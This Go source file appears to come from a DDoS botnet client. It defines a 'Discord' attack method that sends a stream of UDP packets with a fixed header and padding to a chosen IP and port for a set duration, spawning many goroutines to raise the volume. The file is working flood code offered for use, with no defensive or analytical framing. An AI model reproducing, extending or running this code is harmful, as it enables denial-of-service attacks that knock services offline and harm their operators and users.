package methods

import (
	"fmt"
	"homo/client/balancer"
	"net"
	"strconv"
	"strings"
	"time"
)

func Discord(target string, port string, duration string) {

	defer Catch()

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go discord(target, port)
		time.Sleep(100 * time.Millisecond)
		go discord(target, port)
	}

}

func discord(_target string, _port string) {
	defer Catch()
DISCORD:

	target := net.ParseIP(_target)
	port, err := strconv.Atoi(_port)

	if err != nil {
		fmt.Println(err)
		return
	}

	conn, err := net.DialUDP("udp", &net.UDPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 0}, &net.UDPAddr{IP: target, Port: port})

	if err != nil {
		fmt.Println(err)
		goto DISCORD
	}
	defer conn.Close()

	for i := 0; i < 20; i++ {
		select {
		case <-balancer.BalanceCh:

			fmt.Println("balancer")
			time.Sleep(5 * time.Second)
		default:

			fmt.Println(i)
			go senddispacket(conn, (i+200)*2, i)
			go senddispacket(conn, (i+200)*2, i)
			go senddispacket(conn, (i+200)*2, i)

			time.Sleep(200 * time.Millisecond)
		}
	}
}

func senddispacket(conn net.Conn, size, offset int) {
	defer Catch()
	packet := createPacket(size, offset)
	_, err := conn.Write(packet)

	if err != nil {
		fmt.Println(err)
		return
	}
}

// for discord method only
func createPacket(len, offset int) []byte {
	defer Catch()
	data := []byte{0x13, 0x37, 0xca, 0xfe, 0x01, 0x00, 0x00, 0x00}

	for i := 0; i <= len-offset; i++ {
		data = append(data, 0x00)
	}

	return data
}
